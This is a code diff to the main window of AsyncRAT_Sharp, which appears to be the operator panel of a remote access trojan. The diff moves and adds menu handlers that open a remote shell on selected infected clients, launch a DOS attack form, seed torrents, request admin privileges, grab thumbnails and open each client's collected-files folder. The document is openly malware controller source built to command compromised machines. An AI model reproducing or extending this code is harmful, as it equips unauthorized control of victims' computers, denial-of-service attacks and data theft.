@@ -88,8 +88,6 @@ namespace AsyncRAT_Sharp
             {
                 portsFrm.ShowDialog();
             }
-
-            Properties.Settings.Default.Reload();
 #endif
 
 
@@ -166,7 +164,7 @@ namespace AsyncRAT_Sharp
             toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.Sent).ToString()}     Received {Methods.BytesToString(Settings.Received).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     RAM {(int)performanceCounter2.NextValue()}%";
         }
 
-      
+
         private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
         {
             using (FormBuilder formBuilder = new FormBuilder())
@@ -204,20 +202,26 @@ namespace AsyncRAT_Sharp
         }
         private void GetThumbnails(object obj)
         {
-            if (listView1.Items.Count > 0)
+            if (Program.form1.listView3.InvokeRequired)
             {
-                try
+                Program.form1.listView3.BeginInvoke((MethodInvoker)(() =>
                 {
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "thumbnails";
-
-                    foreach (ListViewItem itm in listView1.Items)
+                    if (listView1.Items.Count > 0)
                     {
-                        Clients client = (Clients)itm.Tag;
-                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                        try
+                        {
+                            MsgPack msgpack = new MsgPack();
+                            msgpack.ForcePathObject("Packet").AsString = "thumbnails";
+
+                            foreach (ListViewItem itm in listView1.Items)
+                            {
+                                Clients client = (Clients)itm.Tag;
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            }
+                        }
+                        catch { }
                     }
-                }
-                catch { }
+                }));
             }
         }
 
@@ -249,7 +253,7 @@ namespace AsyncRAT_Sharp
                 Properties.Settings.Default.Notification = true;
             }
             Properties.Settings.Default.Save();
-        }     
+        }
 
         private async void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -524,11 +528,6 @@ namespace AsyncRAT_Sharp
             catch { }
         }
 
-        private void SEEDTORRENTToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-
-        }
-
         private void VisitWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
@@ -674,14 +673,6 @@ namespace AsyncRAT_Sharp
             catch { }
         }
 
-        private readonly FormDOS formDOS = new FormDOS();
-
-        private void DOSAttackToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            formDOS.Show();
-
-        }
-
         private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             try
@@ -707,39 +698,6 @@ namespace AsyncRAT_Sharp
                                     C = client
                                 };
                                 fileManager.Show();
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
-                        }));
-                    }
-                }
-            }
-            catch { }
-        }
-
-        private void RemoteShellToolStripMenuItem1_Click(object sender, EventArgs e)
-        {
-            try
-            {
-                if (listView1.SelectedItems.Count > 0)
-                {
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "shell";
-                    foreach (ListViewItem itm in listView1.SelectedItems)
-                    {
-                        Clients client = (Clients)itm.Tag;
-                        this.BeginInvoke((MethodInvoker)(() =>
-                        {
-                            FormShell shell = (FormShell)Application.OpenForms["shell:" + client.ID];
-                            if (shell == null)
-                            {
-                                shell = new FormShell
-                                {
-                                    Name = "shell:" + client.ID,
-                                    Text = "shell:" + client.ID,
-                                    F = this,
-                                    C = client
-                                };
-                                shell.Show();
                                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                             }
                         }));
@@ -862,12 +820,6 @@ namespace AsyncRAT_Sharp
                 }
                 catch { }
             }
-        }
-
-        private void SeedTorrentToolStripMenuItem1_Click(object sender, EventArgs e)
-        {
-            FormTorrent formTorrent = new FormTorrent();
-            formTorrent.Show();
         }
 
         private void GetAdminPrivilegesToolStripMenuItem_Click(object sender, EventArgs e)
@@ -1081,6 +1033,80 @@ namespace AsyncRAT_Sharp
                     }
                 }
                 catch { }
+            }
+        }
+
+        private void ShowFolderToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                try
+                {
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        Clients client = (Clients)itm.Tag;
+                        string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID);
+                        if (Directory.Exists(fullPath))
+                        {
+                            Process.Start(fullPath);
+                        }
+                    }
+                }
+                catch { }
+            }
+        }
+
+        private void SeedTorrentToolStripMenuItem1_Click_1(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                using (FormTorrent formTorrent = new FormTorrent())
+                {
+                    formTorrent.ShowDialog();
+                }
+            }
+        }
+
+        private void RemoteShellToolStripMenuItem1_Click_1(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "shell";
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        Clients client = (Clients)itm.Tag;
+                        this.BeginInvoke((MethodInvoker)(() =>
+                        {
+                            FormShell shell = (FormShell)Application.OpenForms["shell:" + client.ID];
+                            if (shell == null)
+                            {
+                                shell = new FormShell
+                                {
+                                    Name = "shell:" + client.ID,
+                                    Text = "shell:" + client.ID,
+                                    F = this,
+                                    C = client
+                                };
+                                shell.Show();
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            }
+                        }));
+                    }
+                }
+            }
+            catch { }
+        }
+
+        private readonly FormDOS formDOS = new FormDOS();
+        private void DOSAttackToolStripMenuItem_Click_1(object sender, EventArgs e)
+        {
+            if (listView1.Items.Count > 0)
+            {
+                formDOS.Show();
+
             }
         }
     }
